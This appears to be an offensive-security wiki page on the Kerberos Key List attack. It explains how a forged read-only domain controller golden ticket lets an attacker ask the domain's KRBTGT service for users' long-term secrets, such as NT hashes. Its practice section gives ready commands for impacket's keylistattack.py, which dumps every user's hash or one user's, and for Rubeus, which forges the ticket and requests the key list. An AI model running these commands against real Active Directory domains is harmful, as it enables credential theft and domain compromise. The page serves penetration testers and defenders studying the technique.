# Kerberos key list

## Theory

It is possible to retrieve the long term secret of a user (e.g. NT hash) by sending a `TGS-REQ` (service ticket request) to the `KRBTGT` service with a [`KERB-KEY-LIST-REQ`](https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-kile/732211ae-4891-40d3-b2b6-85ebd6f5ffff) message type. This was introduced initially to support SSO with legacy protocols (e.g. NTLM) with Azure AD on on-premises resources.\
An attacker can abuse this by forging a [RODC golden ticket](../../kerberos/forged-tickets/rodc-golden-tickets.md) for a target user and use it to send a `TGS-REQ` to the `KRBTGT` service with a `padata` filed value of [161](https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-kile/ae60c948-fda8-45c2-b1d1-a71b484dd1f7) (`KERB-KEY-LIST-REQ`). Knowing the `KRBTGT` key of the RODC is required here. The `TGS-REP` will contain the long term secret of the user in the `KERB-KEY-LIST-REP` key value.

## Practice

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, the [keylistattack.py](https://github.com/fortra/impacket/blob/master/examples/keylistattack.py) tool (Python) can be used for this purpose.

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">#Attempt to dump all the users' hashes even the ones in the Denied list
#Low privileged credentials are needed in the command for the SAMR enumeration
<strong>keylistattack.py -rodcNo "$KBRTGT_NUMBER" -rodcKey "$KRBTGT_AES_KEY" -full "$DOMAIN"/"$USER":"$PASSWORD"@"$RODC-server"
</strong>
#Attempt to dump all the users' hashes but filter the ones in the Denied list
#Low privileged credentials are needed in the command for the SAMR enumeration
<strong>keylistattack.py -rodcNo "$KBRTGT_NUMBER" -rodcKey "$KRBTGT_AES_KEY" "$DOMAIN"/"$USER":"$PASSWORD"@"$RODC-server"
</strong>
#Attempt to dump a specific user's hash
<strong>keylistattack.py -rodcNo "$KBRTGT_NUMBER" -rodcKey "$KRBTGT_AES_KEY" -t "$TARGETUSER" -kdc "$RODC_FQDN" LIST
</strong></code></pre>
{% endtab %}

{% tab title="Windows" %}
From Windows systems, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for this purpose.&#x20;

{% code overflow="wrap" %}
```powershell
# 1. Forge a RODC Golden ticket
Rubeus.exe golden /rodcNumber:$KBRTGT_NUMBER /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket.kirbi /aes256:$KRBTGT_AES_KEY /user:USER /id:USER_RID /domain:domain.local /sid:DOMAIN_SID

# 2. Request a TGT via TGS-REQ request and retrieve the NT hash of the user in the response
Rubeus.exe asktgs /enctype:aes256 /keyList /ticket:ticket.kirbi /service:krbtgt/domain.local 
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://www.secureauth.com/blog/the-kerberos-key-list-attack-the-return-of-the-read-only-domain-controllers/" %}
